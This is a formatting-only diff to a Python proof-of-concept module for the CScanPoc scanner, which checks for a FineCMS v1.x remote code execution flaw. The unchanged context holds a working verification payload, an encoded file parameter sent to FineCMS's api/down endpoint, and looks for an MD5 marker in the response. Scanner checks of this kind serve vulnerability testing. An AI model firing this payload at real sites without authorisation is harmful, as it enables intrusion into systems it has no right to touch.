@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'FineCMS_0003' # 平台漏洞编号，留空
+    vuln_id = 'FineCMS_0003'  # 平台漏洞编号，留空
     name = 'FineCMS v1.x远程代码执行漏洞'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = '2014-05-20'  # 漏洞公布时间
     desc = '''
         FineCMS是一款基于PHP+MySql开发的内容管理系统，采用MVC设计模式实现业务逻辑与表现层的适当分离，使网页设计师能够轻松设计出理想的模板，
@@ -23,6 +24,7 @@ class Vuln(ABVuln):
     product = 'FineCMS'  # 漏洞应用名称
     product_version = 'v1.x'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '93620c73-b3a6-4521-8a7b-0e6491967e63'
     author = '47bwy'  # POC编写者
@@ -35,11 +37,11 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             hh = hackhttp.hackhttp()
             payload = '/index.php?c=api&a=down&file=YTJkOS81dEhyMXVWMkF5SWVxTCt5eHF3eE5ZMUM0a2ZDWjE4WUpCb09ZUHhnVkJsRGZFYjc4cXpadWNuUk9qT0NR'
             verify_url = self.target + payload
-            code, head, body, errcode, log = hh.http(verify_url);
+            code, head, body, errcode, log = hh.http(verify_url)
             #r = requests.get('-L %s' % verify_url)
 
             if 'c4ca4238a0b923820dcc509a6f75849b' in body:
@@ -51,6 +53,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
